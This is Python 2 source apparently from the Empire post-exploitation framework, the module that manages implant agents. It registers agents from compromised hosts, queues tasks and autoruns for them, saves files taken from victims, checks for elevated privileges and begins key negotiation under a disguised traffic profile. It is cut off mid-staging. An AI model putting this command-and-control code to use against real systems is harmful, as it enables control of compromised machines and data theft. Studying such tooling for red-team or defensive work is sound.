"""

Main agent handling functionality for Empire.

The Agents() class in instantiated in ./empire.py by the main menu and includes:

    get_db_connection()         - returns the empire.py:mainMenu database connection object
    is_agent_present()          - returns True if an agent is present in the self.agents cache
    add_agent()                 - adds an agent to the self.agents cache and the backend database
    remove_agent_db()           - removes an agent from the self.agents cache and the backend database
    is_ip_allowed()             - checks if a supplied IP is allowed as per the whitelist/blacklist
    save_file()                 - saves a file download for an agent to the appropriately constructed path.
    save_module_file()          - saves a module output file to the appropriate path
    save_agent_log()            - saves the agent console output to the agent's log file
    is_agent_elevated()         - checks whether a specific sessionID is currently elevated
    get_agents_db()             - returns all active agents from the database
    get_agent_names_db()        - returns all names of active agents from the database
    get_agent_ids_db()          - returns all IDs of active agents from the database
    get_agent_db()              - returns complete information for the specified agent from the database
    get_agent_nonce_db()        - returns the nonce for this sessionID
    get_language_db()           - returns the language used by this agent
    get_language_version_db()   - returns the language version used by this agent
    get_agent_session_key_db()  - returns the AES session key from the database for a sessionID
    get_agent_results_db()      - returns agent results from the backend database
    get_agent_id_db()           - returns an agent sessionID based on the name
    get_agent_name_db()         - returns an agent name based on sessionID
    get_agent_hostname_db()     - returns an agent's hostname based on sessionID
    get_agent_os_db()           - returns an agent's operating system details based on sessionID
    get_agent_functions()       - returns the tab-completable functions for an agent from the cache
    get_agent_functions_db()    - returns the tab-completable functions for an agent from the database
    get_agents_for_listener()   - returns all agent objects linked to a given listener name
    get_agent_names_listener_db()-returns all agent names linked to a given listener name
    get_autoruns_db()           - returns any global script autoruns
    update_agent_results_db()   - updates agent results in the database
    update_agent_sysinfo_db()   - updates agent system information in the database
    update_agent_lastseen_db()  - updates the agent's last seen timestamp in the database
    update_agent_listener_db()  - updates the agent's listener name in the database
    rename_agent()              - renames an agent
    set_agent_field_db()        - sets field:value for a particular sessionID in the database.
    set_agent_functions_db()    - sets the tab-completable functions for the agent in the database
    set_autoruns_db()           - sets the global script autorun in the config in the database
    clear_autoruns_db()         - clears the currently set global script autoruns in the config in the database
    add_agent_task_db()         - adds a task to the specified agent's buffer in the database
    get_agent_tasks_db()        - retrieves tasks for our agent from the database
    get_agent_tasks_listener_db()- retrieves tasks for our agent from the database keyed by listener name
    clear_agent_tasks_db()      - clear out one (or all) agent tasks in the database
    handle_agent_staging()      - handles agent staging neogotiation
    handle_agent_data()         - takes raw agent data and processes it appropriately.
    handle_agent_request()      - return any encrypted tasks for the particular agent
    handle_agent_response()     - parses agent raw replies into structures
    process_agent_packet()      - processes agent reply structures appropriately

handle_agent_data() is the main function that should be used by external listener modules

Most methods utilize self.lock to deal with the concurreny issue of kicking off threaded listeners.

"""

import os
import json
import string
import threading
from pydispatch import dispatcher
from zlib_wrapper import compress
from zlib_wrapper import decompress

# Empire imports
import encryption
import helpers
import packets
import messages


class Agents:
    """
    Main class that contains agent handling functionality, including key
    negotiation in process_get() and process_post().
    """
    def __init__(self, MainMenu, args=None):

        # pull out the controller objects
        self.mainMenu = MainMenu
        self.installPath = self.mainMenu.installPath
        self.args = args

        # internal agent dictionary for the client's session key, funcions, and URI sets
        #   this is done to prevent database reads for extremely common tasks (like checking tasking URI existence)
        #   self.agents[sessionID] = {  'sessionKey' : clientSessionKey,
        #                               'functions' : [tab-completable function names for a script-import]
        #                            }
        self.agents = {}

        # used to protect self.agents and self.mainMenu.conn during threaded listener access
        self.lock = threading.Lock()

        # reinitialize any agents that already exist in the database
        dbAgents = self.get_agents_db()
        for agent in dbAgents:
            agentInfo = {'sessionKey' : agent['session_key'], 'functions' : agent['functions']}
            self.agents[agent['session_id']] = agentInfo

        # pull out common configs from the main menu object in empire.py
        self.ipWhiteList = self.mainMenu.ipWhiteList
        self.ipBlackList = self.mainMenu.ipBlackList


    def get_db_connection(self):
        """
        Returns the 
        """
        self.lock.acquire()
        self.mainMenu.conn.row_factory = None
        self.lock.release()
        return self.mainMenu.conn


    ###############################################################
    #
    # Misc agent methods
    #
    ###############################################################
    
    def is_agent_present(self, sessionID):
        """
        Checks if a given sessionID corresponds to an active agent.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id_db(sessionID)
        if nameid:
            sessionID = nameid
        
        return sessionID in self.agents


    def add_agent(self, sessionID, externalIP, delay, jitter, profile, killDate, workingHours, lostLimit, sessionKey=None, nonce='', listener='', language=''):
        """
        Add an agent to the internal cache and database.
        """

        currentTime = helpers.get_datetime()
        checkinTime = currentTime
        lastSeenTime = currentTime

        # generate a new key for this agent if one wasn't supplied
        if not sessionKey:
            sessionKey = encryption.generate_aes_key()

        if not profile or profile == '':
            profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"

        conn = self.get_db_connection()

        try:
            self.lock.acquire()
            cur = conn.cursor()
            # add the agent and report the initial checkin in the reporting database
            cur.execute("INSERT INTO agents (name, session_id, delay, jitter, external_ip, session_key, nonce, checkin_time, lastseen_time, profile, kill_date, working_hours, lost_limit, listener, language) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)", (sessionID, sessionID, delay, jitter, externalIP, sessionKey, nonce, checkinTime, lastSeenTime, profile, killDate, workingHours, lostLimit, listener, language))
            cur.execute("INSERT INTO reporting (name, event_type, message, time_stamp) VALUES (?,?,?,?)", (sessionID, "checkin", checkinTime, helpers.get_datetime()))
            cur.close()

            # initialize the tasking/result buffers along with the client session key
            self.agents[sessionID] = {'sessionKey': sessionKey, 'functions': []}
        finally:
            self.lock.release()


    def remove_agent_db(self, sessionID):
        """
        Remove an agent to the internal cache and database.
        """

        conn = self.get_db_connection()

        try:
            if sessionID == '%' or sessionID.lower() == 'all':
                sessionID = '%'
                self.lock.acquire()
                self.agents = {}
            else:
                # see if we were passed a name instead of an ID
                nameid = self.get_agent_id_db(sessionID)
                if nameid:
                    sessionID = nameid

                self.lock.acquire()
                # remove the agent from the internal cache
                self.agents.pop(sessionID, None)

            # remove the agent from the database
            cur = conn.cursor()
            cur.execute("DELETE FROM agents WHERE session_id LIKE ?", [sessionID])
            cur.close()
        finally:
            self.lock.release()


    def is_ip_allowed(self, ip_address):
        """
        Check if the ip_address meshes with the whitelist/blacklist, if set.
        """

        self.lock.acquire()
        if self.ipBlackList:
            if self.ipWhiteList:
                results = ip_address in self.ipWhiteList and ip_address not in self.ipBlackList
                self.lock.release()
                return results
            else:
                results = ip_address not in self.ipBlackList
                self.lock.release()
                return results
        if self.ipWhiteList:
            results = ip_address in self.ipWhiteList
            self.lock.release()
            return results
        else:
            self.lock.release()
            return True


    def save_file(self, sessionID, path, data, append=False):
        """
        Save a file download for an agent to the appropriately constructed path.
        """

        sessionID = self.get_agent_name_db(sessionID)
        lang = self.get_language_db(sessionID)
        parts = path.split("\\")
        parts

        # construct the appropriate save path
        save_path = "%sdownloads/%s%s" % (self.installPath, sessionID, "/".join(parts[0:-1]))
        filename = os.path.basename(parts[-1])

        try:
            self.lock.acquire()
            # fix for 'skywalker' exploit by @zeroSteiner
            safePath = os.path.abspath("%sdownloads/" % self.installPath)
            if not os.path.abspath(save_path + "/" + filename).startswith(safePath):
                dispatcher.send("[!] WARNING: agent %s attempted skywalker exploit!" % (sessionID), sender='Agents')
                dispatcher.send("[!] attempted overwrite of %s with data %s" % (path, data), sender='Agents')
                return

            # make the recursive directory structure if it doesn't already exist
            if not os.path.exists(save_path):
                os.makedirs(save_path)

            # overwrite an existing file
            if not append:
                f = open("%s/%s" % (save_path, filename), 'wb')
            else:
                # otherwise append
                f = open("%s/%s" % (save_path, filename), 'ab')
                
            if "python" in lang:
                print helpers.color("\n[*] Compressed size of %s download: %s" %(filename, helpers.get_file_size(data)), color="green")
                d = decompress.decompress()
                dec_data = d.dec_data(data)
                print helpers.color("[*] Final size of %s wrote: %s" %(filename, helpers.get_file_size(dec_data['data'])), color="green")
                if not dec_data['crc32_check']:
                    dispatcher.send("[!] WARNING: File agent %s failed crc32 check during decompressing!." %(nameid))
                    print helpers.color("[!] WARNING: File agent %s failed crc32 check during decompressing!." %(nameid))
                    dispatcher.send("[!] HEADER: Start crc32: %s -- Received crc32: %s -- Crc32 pass: %s!." %(dec_data['header_crc32'],dec_data['dec_crc32'],dec_data['crc32_check']))
                    print helpers.color("[!] HEADER: Start crc32: %s -- Received crc32: %s -- Crc32 pass: %s!." %(dec_data['header_crc32'],dec_data['dec_crc32'],dec_data['crc32_check']))
                data = dec_data['data']

            f.write(data)
            f.close()
        finally:
            self.lock.release()

        # notify everyone that the file was downloaded
        dispatcher.send("[+] Part of file %s from %s saved" % (filename, sessionID), sender='Agents')


    def save_module_file(self, sessionID, path, data):
        """
        Save a module output file to the appropriate path.
        """

        sessionID = self.get_agent_name_db(sessionID)
        lang = self.get_language_db(sessionID)
        parts = path.split("/")

        # construct the appropriate save path
        save_path = "%s/downloads/%s/%s" % (self.installPath, sessionID, "/".join(parts[0:-1]))
        filename = parts[-1]

        # decompress data if coming from a python agent:
        if "python" in lang:
            print helpers.color("\n[*] Compressed size of %s download: %s" %(filename, helpers.get_file_size(data)), color="green")
            d = decompress.decompress()
            dec_data = d.dec_data(data)
            print helpers.color("[*] Final size of %s wrote: %s" %(filename, helpers.get_file_size(dec_data['data'])), color="green")
            if not dec_data['crc32_check']:
                dispatcher.send("[!] WARNING: File agent %s failed crc32 check during decompressing!." %(nameid))
                print helpers.color("[!] WARNING: File agent %s failed crc32 check during decompressing!." %(nameid))
                dispatcher.send("[!] HEADER: Start crc32: %s -- Received crc32: %s -- Crc32 pass: %s!." %(dec_data['header_crc32'],dec_data['dec_crc32'],dec_data['crc32_check']))
                print helpers.color("[!] HEADER: Start crc32: %s -- Received crc32: %s -- Crc32 pass: %s!." %(dec_data['header_crc32'],dec_data['dec_crc32'],dec_data['crc32_check']))
            data = dec_data['data']

        try:
            self.lock.acquire()
            # fix for 'skywalker' exploit by @zeroSteiner
            safePath = os.path.abspath("%s/downloads/" % self.installPath)
            if not os.path.abspath(save_path + "/" + filename).startswith(safePath):
                dispatcher.send("[!] WARNING: agent %s attempted skywalker exploit!" % (sessionID), sender='Agents')
                dispatcher.send("[!] attempted overwrite of %s with data %s" % (path, data), sender='Agents')
                return

            # make the recursive directory structure if it doesn't already exist
            if not os.path.exists(save_path):
                os.makedirs(save_path)

            # save the file out
            f = open(save_path + "/" + filename, 'w')
            f.write(data)
            f.close()
        finally:
            self.lock.release()

        # notify everyone that the file was downloaded
        # dispatcher.send("[+] File "+path+" from "+str(sessionID)+" saved", sender='Agents')
        dispatcher.send("[+] File %s from %s saved" % (path, sessionID), sender='Agents')

        return "/downloads/%s/%s/%s" % (sessionID, "/".join(parts[0:-1]), filename)


    def save_agent_log(self, sessionID, data):
        """
        Save the agent console output to the agent's log file.
        """

        name = self.get_agent_name_db(sessionID)
        save_path = self.installPath + "/downloads/" + str(name) + "/"

        try:
            self.lock.acquire()
            # make the recursive directory structure if it doesn't already exist
            if not os.path.exists(save_path):
                os.makedirs(save_path)

            current_time = helpers.get_datetime()

            f = open("%s/agent.log" % (save_path), 'a')
            f.write("\n" + current_time + " : " + "\n")
            f.write(data + "\n")
            f.close()
        finally:
            self.lock.release()


    ###############################################################
    #
    # Methods to get information from agent fields.
    #
    ###############################################################

    def is_agent_elevated(self, sessionID):
        """
        Check whether a specific sessionID is currently elevated.

        This means root for OS X/Linux and high integrity for Windows.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id_db(sessionID)
        if nameid:
            sessionID = nameid
        
        conn = self.get_db_connection()
        try:
            self.lock.acquire()
            cur = conn.cursor()
            cur.execute("SELECT high_integrity FROM agents WHERE session_id=?", [sessionID])
            elevated = cur.fetchone()
            cur.close()
        finally:
            self.lock.release()

        if elevated and elevated != None and elevated != ():
            return int(elevated[0]) == 1
        else:
            return False


    def get_agents_db(self):
        """
        Return all active agents from the database.
        """
        conn = self.get_db_connection()
        results = None
        try:
            self.lock.acquire()
            oldFactory = conn.row_factory
            conn.row_factory = helpers.dict_factory # return results as a dictionary
            cur = conn.cursor()
            cur.execute("SELECT * FROM agents")
            results = cur.fetchall()
            cur.close()
            conn.row_factory = oldFactory
        finally:
            self.lock.release()

        return results


    def get_agent_names_db(self):
        """
        Return all names of active agents from the database.
        """

        conn = self.get_db_connection()
        try:
            self.lock.acquire()
            cur = conn.cursor()
            cur.execute("SELECT name FROM agents")
            results = cur.fetchall()
            cur.close()
        finally:
            self.lock.release()

        # make sure names all ascii encoded
        results = [r[0].encode('ascii', 'ignore') for r in results]
        return results


    def get_agent_ids_db(self):
        """
        Return all IDs of active agents from the database.
        """

        conn = self.get_db_connection()
        try:
            self.lock.acquire()
            cur = conn.cursor()
            cur.execute("SELECT session_id FROM agents")
            results = cur.fetchall()
            cur.close()
        finally:
            self.lock.release()

        # make sure names all ascii encoded
        results = [str(r[0]).encode('ascii', 'ignore') for r in results if r]
        return results


    def get_agent_db(self, sessionID):
        """
        Return complete information for the specified agent from the database.
        """

        conn = self.get_db_connection()

        try:
            self.lock.acquire()
            oldFactory = conn.row_factory
            conn.row_factory = helpers.dict_factory # return results as a dictionary
            cur = conn.cursor()
            cur.execute("SELECT * FROM agents WHERE session_id = ? OR name = ?", [sessionID, sessionID])
            agent = cur.fetchone()
            cur.close()
            conn.row_factory = oldFactory
        finally:
            self.lock.release()

        return agent


    def get_agent_nonce_db(self, sessionID):
        """
        Return the nonce for this sessionID.
        """

        conn = self.get_db_connection()
        try:
            self.lock.acquire()
            cur = conn.cursor()
            cur.execute("SELECT nonce FROM agents WHERE session_id=?", [sessionID])
            nonce = cur.fetchone()
            cur.close()
        finally:
            self.lock.release()

        if nonce and nonce is not None:
            if type(nonce) is str:
                return nonce
            else:
                return nonce[0]


    def get_language_db(self, sessionID):
        """
        Return the language used by this agent.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id_db(sessionID)
        if nameid:
            sessionID = nameid

        conn = self.get_db_connection()
        try:
            self.lock.acquire()
            cur = conn.cursor()
            cur.execute("SELECT language FROM agents WHERE session_id=?", [sessionID])
            language = cur.fetchone()
            cur.close()
        finally:
            self.lock.release()

        if language is not None:
            if isinstance(language, str):
                return language
            else:
                return language[0]


    def get_language_version_db(self, sessionID):
        """
        Return the language version used by this agent.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id_db(sessionID)
        if nameid:
            sessionID = nameid

        conn = self.get_db_connection()
        try:
            self.lock.acquire()
            cur = conn.cursor()
            cur.execute("SELECT language_version FROM agents WHERE session_id=?", [sessionID])
            language = cur.fetchone()
            cur.close()
        finally:
            self.lock.release()

        if language is not None:
            if isinstance(language, str):
                return language
            else:
                return language[0]


    def get_agent_session_key_db(self, sessionID):
        """
        Return AES session key from the database for this sessionID.
        """

        conn = self.get_db_connection()
        try:
            self.lock.acquire()
            cur = conn.cursor()
            cur.execute("SELECT session_key FROM agents WHERE session_id = ? OR name = ?", [sessionID, sessionID])
            sessionKey = cur.fetchone()
            cur.close()
        finally:
            self.lock.release()

        if sessionKey is not None:
            if isinstance(sessionKey, str):
                return sessionKey
            else:
                return sessionKey[0]


    def get_agent_results_db(self, sessionID):
        """
        Return agent results from the backend database.
        """

        agent_name = sessionID

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id_db(sessionID)
        if nameid:
            sessionID = nameid

        if sessionID not in self.agents:
            print helpers.color("[!] Agent %s not active." % (agent_name))
        else:
            conn = self.get_db_connection()
            try:
                self.lock.acquire()
                cur = conn.cursor()
                cur.execute("SELECT results FROM agents WHERE session_id=?", [sessionID])
                results = cur.fetchone()

                cur.execute("UPDATE agents SET results=? WHERE session_id=?", ['', sessionID])
                cur.close()
            finally:
                self.lock.release()

            if results and results[0] and results[0] != '':
                out = json.loads(results[0])
                if out:
                    return "\n".join(out)
            else:
                return ''


    def get_agent_id_db(self, name):
        """
        Get an agent sessionID based on the name.
        """

        conn = self.get_db_connection()
        try:
            self.lock.acquire()
            cur = conn.cursor()
            cur.execute("SELECT session_id FROM agents WHERE name=?", [name])
            results = cur.fetchone()
            cur.close()
        finally:
            self.lock.release()
        if results:
            return results[0]
        else:
            return None


    def get_agent_name_db(self, sessionID):
        """
        Return an agent name based on sessionID.
        """

        conn = self.get_db_connection()
        try:
            self.lock.acquire()
            cur = conn.cursor()
            cur.execute("SELECT name FROM agents WHERE session_id = ? or name = ?", [sessionID, sessionID])
            results = cur.fetchone()
            cur.close()
        finally:
            self.lock.release()

        if results:
            return results[0]
        else:
            return None


    def get_agent_hostname_db(self, sessionID):
        """
        Return an agent's hostname based on sessionID.
        """

        conn = self.get_db_connection()
        try:
            self.lock.acquire()
            cur = conn.cursor()
            cur.execute("SELECT hostname FROM agents WHERE session_id=? or name=?", [sessionID, sessionID])
            results = cur.fetchone()
            cur.close()
        finally:
            self.lock.release()

        if results:
            return results[0]
        else:
            return None


    def get_agent_os_db(self, sessionID):
        """
        Return an agent's operating system details based on sessionID.
        """

        conn = self.get_db_connection()
        try:
            self.lock.acquire()
            cur = conn.cursor()
            cur.execute("SELECT os_details FROM agents WHERE session_id=? or name=?", [sessionID, sessionID])
            results = cur.fetchone()
            cur.close()
        finally:
            self.lock.release()

        if results:
            return results[0]
        else:
            return None


    def get_agent_functions(self, sessionID):
        """
        Get the tab-completable functions for an agent.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id_db(sessionID)
        if nameid:
            sessionID = nameid

        results = []

        try:
            self.lock.acquire()
            if sessionID in self.agents:
                results = self.agents[sessionID]['functions']
        finally:
            self.lock.release()

        return results


    def get_agent_functions_db(self, sessionID):
        """
        Return the tab-completable functions for an agent from the database.
        """

        conn = self.get_db_connection()
        try:
            self.lock.acquire()
            cur = conn.cursor()
            cur.execute("SELECT functions FROM agents WHERE session_id=? OR name=?", [sessionID, sessionID])
            functions = cur.fetchone()
            cur.close()
        finally:
            self.lock.release()

        if functions is not None and functions[0] is not None:
            return functions[0].split(',')
        else:
            return []


    def get_agents_for_listener(self, listenerName):
        """
        Return agent objects linked to a given listener name.
        """

        conn = self.get_db_connection()
        try:
            self.lock.acquire()
            cur = conn.cursor()
            cur.execute("SELECT session_id FROM agents WHERE listener=?", [listenerName])
            results = cur.fetchall()
            cur.close()
        finally:
            self.lock.release()

        # make sure names all ascii encoded
        results = [r[0].encode('ascii', 'ignore') for r in results]
        return results


    def get_agent_names_listener_db(self, listenerName):
        """
        Return agent names linked to the given listener name.
        """

        conn = self.get_db_connection()

        try:
            self.lock.acquire()
            oldFactory = conn.row_factory
            conn.row_factory = helpers.dict_factory # return results as a dictionary
            cur = conn.cursor()
            cur.execute("SELECT * FROM agents WHERE listener=?", [listenerName])
            agents = cur.fetchall()
            cur.close()
            conn.row_factory = oldFactory
        finally:
            self.lock.release()

        return agents


    def get_autoruns_db(self):
        """
        Return any global script autoruns.
        """

        conn = self.get_db_connection()

        autoruns = None

        try:
            self.lock.acquire()
            cur = conn.cursor()
            cur.execute("SELECT autorun_command FROM config")
            results = cur.fetchone()
            if results:
                autorun_command = results[0]
            else:
                autorun_command = ''

            cur = conn.cursor()
            cur.execute("SELECT autorun_data FROM config")
            results = cur.fetchone()
            if results:
                autorun_data = results[0]
            else:
                autorun_data = ''
            cur.close()
            autoruns = [autorun_command, autorun_data]
        finally:
            self.lock.release()

        return autoruns


    ###############################################################
    #
    # Methods to update agent information fields.
    #
    ###############################################################

    def update_agent_results_db(self, sessionID, results):
        """
        Update agent results in the database.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id_db(sessionID)
        if nameid:
            sessionID = nameid

        if sessionID in self.agents:
            conn = self.get_db_connection()
            try:
                self.lock.acquire()
                cur = conn.cursor()

                # get existing agent results
                cur.execute("SELECT results FROM agents WHERE session_id LIKE ?", [sessionID])
                agent_results = cur.fetchone()

                if agent_results and agent_results[0]:
                    agent_results = json.loads(agent_results[0])
                else:
                    agent_results = []

                agent_results.append(results)
                cur.execute("UPDATE agents SET results=? WHERE session_id=?", [json.dumps(agent_results), sessionID])
                cur.close()
            finally:
                self.lock.release()
        else:
            dispatcher.send("[!] Non-existent agent %s returned results" % (sessionID), sender='Agents')


    def update_agent_sysinfo_db(self, sessionID, listener='', external_ip='', internal_ip='', username='', hostname='', os_details='', high_integrity=0, process_name='', process_id='', language_version='', language=''):
        """
        Update an agent's system information.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id_db(sessionID)
        if nameid:
            sessionID = nameid

        conn = self.get_db_connection()
        try:
            self.lock.acquire()
            cur = conn.cursor()
            cur.execute("UPDATE agents SET internal_ip = ?, username = ?, hostname = ?, os_details = ?, high_integrity = ?, process_name = ?, process_id = ?, language_version = ?, language = ? WHERE session_id=?", [internal_ip, username, hostname, os_details, high_integrity, process_name, process_id, language_version, language, sessionID])
            cur.close()
        finally:
            self.lock.release()


    def update_agent_lastseen_db(self, sessionID):
        """
        Update the agent's last seen timestamp in the database.
        """

        current_time = helpers.get_datetime()
        conn = self.get_db_connection()
        try:
            self.lock.acquire()
            cur = conn.cursor()
            cur.execute("UPDATE agents SET lastseen_time=? WHERE session_id=? OR name=?", [current_time, sessionID, sessionID])
            cur.close()
        finally:
            self.lock.release()


    def update_agent_listener_db(self, sessionID, listenerName):
        """
        Update the specified agent's linked listener name in the database.
        """

        conn = self.get_db_connection()
        try:
            self.lock.acquire()
            cur = conn.cursor()
            cur.execute("UPDATE agents SET listener=? WHERE session_id=? OR name=?", [listenerName, sessionID, sessionID])
            cur.close()
        finally:
            self.lock.release()


    def rename_agent(self, oldname, newname):
        """
        Rename a given agent from 'oldname' to 'newname'.
        """

        if not newname.isalnum():
            print helpers.color("[!] Only alphanumeric characters allowed for names.")
            return False

        conn = self.get_db_connection()
        try:
            self.lock.acquire()
            # rename the logging/downloads folder
            oldPath = "%s/downloads/%s/" % (self.installPath, oldname)
            newPath = "%s/downloads/%s/" % (self.installPath, newname)
            retVal = True

            # check if the folder is already used
            if os.path.exists(newPath):
                print helpers.color("[!] Name already used by current or past agent.")
                retVal = False
            else:
                # move the old folder path to the new one
                if os.path.exists(oldPath):
                    os.rename(oldPath, newPath)

                # rename the agent in the database
                cur = conn.cursor()
                cur.execute("UPDATE agents SET name=? WHERE name=?", [newname, oldname])
                cur.execute("INSERT INTO reporting (name,event_type,message,time_stamp) VALUES (?,?,?,?)", (oldname, "rename", newname, helpers.get_datetime()))
                cur.close()

                retVal = True
        finally:
            self.lock.release()

        # signal in the log that we've renamed the agent
        self.save_agent_log(oldname, "[*] Agent renamed from %s to %s" % (oldname, newname))

        return retVal

    def set_agent_field_db(self, field, value, sessionID):
        """
        Set field:value for a particular sessionID in the database.
        """

        conn = self.get_db_connection()
        cur = conn.cursor()
        cur.execute("UPDATE agents SET " + str(field) + "=? WHERE session_id=? OR name=?", [value, sessionID, sessionID])
        cur.close()


    def set_agent_functions_db(self, sessionID, functions):
        """
        Set the tab-completable functions for the agent in the database.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id_db(sessionID)
        if nameid:
            sessionID = nameid

        if sessionID in self.agents:
            self.agents[sessionID]['functions'] = functions

        functions = ','.join(functions)

        conn = self.get_db_connection()
        cur = conn.cursor()
        cur.execute("UPDATE agents SET functions=? WHERE session_id=?", [functions, sessionID])
        cur.close()


    def set_autoruns_db(self, taskCommand, moduleData):
        """
        Set the global script autorun in the config in the database.
        """

        try:
            conn = self.get_db_connection()
            cur = conn.cursor()
            cur.execute("UPDATE config SET autorun_command=?", [taskCommand])
            cur.execute("UPDATE config SET autorun_data=?", [moduleData])
            cur.close()
        except Exception:
            print helpers.color("[!] Error: script autoruns not a database field, run ./setup_database.py to reset DB schema.")
            print helpers.color("[!] Warning: this will reset ALL agent connections!")


    def clear_autoruns_db(self):
        """
        Clear the currently set global script autoruns in the config in the database.
        """

        conn = self.get_db_connection()
        try:
            self.lock.acquire()
            cur = conn.cursor()
            cur.execute("UPDATE config SET autorun_command=''")
            cur.execute("UPDATE config SET autorun_data=''")
            cur.close()
        finally:
            self.lock.release()


    ###############################################################
    #
    # Agent tasking methods
    #
    ###############################################################

    def add_agent_task_db(self, sessionID, taskName, task=''):
        """
        Add a task to the specified agent's buffer in the database.
        """

        agentName = sessionID

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id_db(sessionID)
        if nameid:
            sessionID = nameid

        if sessionID not in self.agents:
            print helpers.color("[!] Agent %s not active." % (agentName))
        else:
            if sessionID:

                dispatcher.send("[*] Tasked %s to run %s" % (sessionID, taskName), sender='Agents')

                conn = self.get_db_connection()
                try:
                    self.lock.acquire()
                    # get existing agent taskings
                    cur = conn.cursor()
                    cur.execute("SELECT taskings FROM agents WHERE session_id=?", [sessionID])
                    agent_tasks = cur.fetchone()

                    if agent_tasks and agent_tasks[0]:
                        agent_tasks = json.loads(agent_tasks[0])
                    else:
                        agent_tasks = []
                    
                    pk = cur.execute("SELECT max(id) from taskings where agent=?", [sessionID]).fetchone()[0]
                    if pk is None:
                        pk = 0
                    pk = (pk + 1) % 65536
                    cur.execute("INSERT INTO taskings (id, agent, data) VALUES(?, ?, ?)", [pk, sessionID, task[:100]])

                    # append our new json-ified task and update the backend
                    agent_tasks.append([taskName, task, pk])
                    cur.execute("UPDATE agents SET taskings=? WHERE session_id=?", [json.dumps(agent_tasks), sessionID])

                    # report the agent tasking in the reporting database
                    cur.execute("INSERT INTO reporting (name,event_type,message,time_stamp,taskID) VALUES (?,?,?,?,?)", (sessionID, "task", taskName + " - " + task[0:50], helpers.get_datetime(), pk))

                    cur.close()

                    # write out the last tasked script to "LastTask" if in debug mode
                    if self.args and self.args.debug:
                        f = open('%s/LastTask' % (self.installPath), 'w')
                        f.write(task)
                        f.close()
                    
                    return pk

                finally:
                    self.lock.release()


    def get_agent_tasks_db(self, sessionID):
        """
        Retrieve tasks for our agent from the database.
        """

        agentName = sessionID

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id_db(sessionID)
        if nameid:
            sessionID = nameid

        if sessionID not in self.agents:
            print helpers.color("[!] Agent %s not active." % (agentName))
            return []
        else:
            conn = self.get_db_connection()
            try:
                self.lock.acquire()
                cur = conn.cursor()
                cur.execute("SELECT taskings FROM agents WHERE session_id=?", [sessionID])
                tasks = cur.fetchone()

                if tasks and tasks[0]:
                    tasks = json.loads(tasks[0])
                    # clear the taskings out
                    cur.execute("UPDATE agents SET taskings=? WHERE session_id=?", ['', sessionID])
                else:
                    tasks = []

                cur.close()
            finally:
                self.lock.release()

            return tasks


    def get_agent_tasks_listener_db(self, listenerName):
        """
        Retrieve tasks for our agent from the database keyed by the
        supplied listner name.

        returns a list of (sessionID, taskings) tuples
        """

        conn = self.get_db_connection()
        results = []

        try:
            self.lock.acquire()
            oldFactory = conn.row_factory
            conn.row_factory = helpers.dict_factory # return results as a dictionary
            cur = conn.cursor()
            cur.execute("SELECT session_id,listener,taskings FROM agents WHERE listener=? AND taskings IS NOT NULL", [listenerName])
            agents = cur.fetchall()

            for agent in agents:
                # print agent
                if agent['taskings']:
                    tasks = json.loads(agent['taskings'])
                    # clear the taskings out
                    cur.execute("UPDATE agents SET taskings=? WHERE session_id=?", ['', agent['session_id']])
                    results.append((agent['session_id'], tasks))
            cur.close()
            conn.row_factory = oldFactory
        finally:
            self.lock.release()

        return results


    def clear_agent_tasks_db(self, sessionID):
        """
        Clear out one (or all) agent tasks in the database.
        """

        if sessionID.lower() == "all":
            sessionID = '%'

        conn = self.get_db_connection()
        try:
            self.lock.acquire()
            cur = conn.cursor()
            cur.execute("UPDATE agents SET taskings=? WHERE session_id LIKE ? OR name LIKE ?", ['', sessionID, sessionID])
            cur.close()
        finally:
            self.lock.release()


    ###############################################################
    #
    # Agent staging/data processing components
    #
    ###############################################################

    def handle_agent_staging(self, sessionID, language, meta, additional, encData, stagingKey, listenerOptions, clientIP='0.0.0.0'):
        """
        Handles agent staging/key-negotiation.

        TODO: does this function need self.lock?
        """

        listenerName = listenerOptions['Name']['Value']

        if meta == 'STAGE0':
            # step 1 of negotiation -> client requests staging code
            return 'STAGE0'

        elif meta == 'STAGE1':
            # step 3 of negotiation -> client posts public key
            dispatcher.send("[*] Agent %s from %s posted public key" % (sessionID, clientIP), sender='Agents')

            # decrypt the agent's public key
            try:
                message = encryption.aes_decrypt_and_verify(stagingKey, encData)
            except Exception as e:
                # if we have an error during decryption
                dispatcher.send("[!] HMAC verification failed from '%s'" % (sessionID), sender='Agents')
                return 'ERROR: HMAC verification failed'

            if language.lower() == 'powershell':
                # strip non-printable characters
                message = ''.join(filter(lambda x: x in string.printable, message))

                # client posts RSA key
                if (len(message) < 400) or (not message.endswith("</RSAKeyValue>")):
                    dispatcher.send("[!] Invalid PowerShell key post format from %s" % (sessionID), sender='Agents')
                    return 'ERROR: Invalid PowerShell key post format'
                else:
                    # convert the RSA key from the stupid PowerShell export format
                    rsaKey = encryption.rsa_xml_to_key(message)

                    if rsaKey:
                        dispatcher.send("[*] Agent %s from %s posted valid PowerShell RSA key" % (sessionID, clientIP), sender='Agents')

                        nonce = helpers.random_string(16, charset=string.digits)
                        delay = listenerOptions['DefaultDelay']['Value']
                        jitter = listenerOptions['DefaultJitter']['Value']
                        profile = listenerOptions['DefaultProfile']['Value']
                        killDate = listenerOptions['KillDate']['Value']
                        workingHours = listenerOptions['WorkingHours']['Value']
                        lostLimit = listenerOptions['DefaultLostLimit']['Value']

                        # add the agent to the database now that it's "checked in"
                        self.mainMenu.agents.add_agent(sessionID, clientIP, delay, jitter, profile, killDate, workingHours, lostLimit, nonce=nonce, listener=listenerName)

                        clientSessionKey = self.mainMenu.agents.get_agent_session_key_db(sessionID)
                        data = "%s%s" % (nonce, clientSessionKey)

                        data = data.encode('ascii', 'ignore') # TODO: is this needed?

                        # step 4 of negotiation -> server returns RSA(nonce+AESsession))
